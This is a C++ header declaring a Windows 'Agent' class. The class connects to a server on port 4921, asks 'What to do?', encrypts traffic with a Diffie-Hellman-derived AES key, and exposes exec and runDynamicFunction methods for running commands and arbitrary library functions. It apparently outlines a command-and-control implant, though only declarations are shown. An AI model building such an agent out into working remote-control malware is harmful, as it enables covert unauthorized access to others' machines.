#pragma once
#ifndef AGENT_H
#define AGENT_H

#include "Socket.h"
#include "DiffieHelman.h"
#include "Base64.h"
//#include "AES_crypto.h"
//#include "aes.h"
#include <Windows.h>
#include <vector>
#include <sstream>
#include <algorithm>
#include <iterator>
#include <thread>
#include <mbedtls\aes.h>
using namespace std;

#define WIN32_LEAN_AND_MEAN
#define DEFAULT_BUFLEN 1024
#define DEFAULT_PORT "4921"
#define SERVER_ADDRESS "127.0.0.1"
#define REQUEST_STRING "What to do?"
#define REQUEST_LENGTH 12
#define MILLISECONDS 24 * 60 * 60 * 1000


class Agent
{
private:
	char recvbuf[DEFAULT_BUFLEN];
	int iResult;
	addrinfo *ptr;
	int recvbuflen;
	Socket mySocket;
	string sharedKey;
	//AES_crypto aes;
	mbedtls_aes_context aes;

	void CreateNewSymetricKey();
	void CreateNewSymetricKeyWithThread();
	void GetRequestFromServer();
public:
	Agent();

	void CreateSocket();
	void SendMessageToServer(const char *message, size_t length);
	void ReciveMessage();
	void Shutdown();
	void Cleanup();
	string runDynamicFunction(string library, string function, string cmd = "");
	string exec(string);
	//DWORD __stdcall ThreadFunc(LPVOID data);
};

#endif
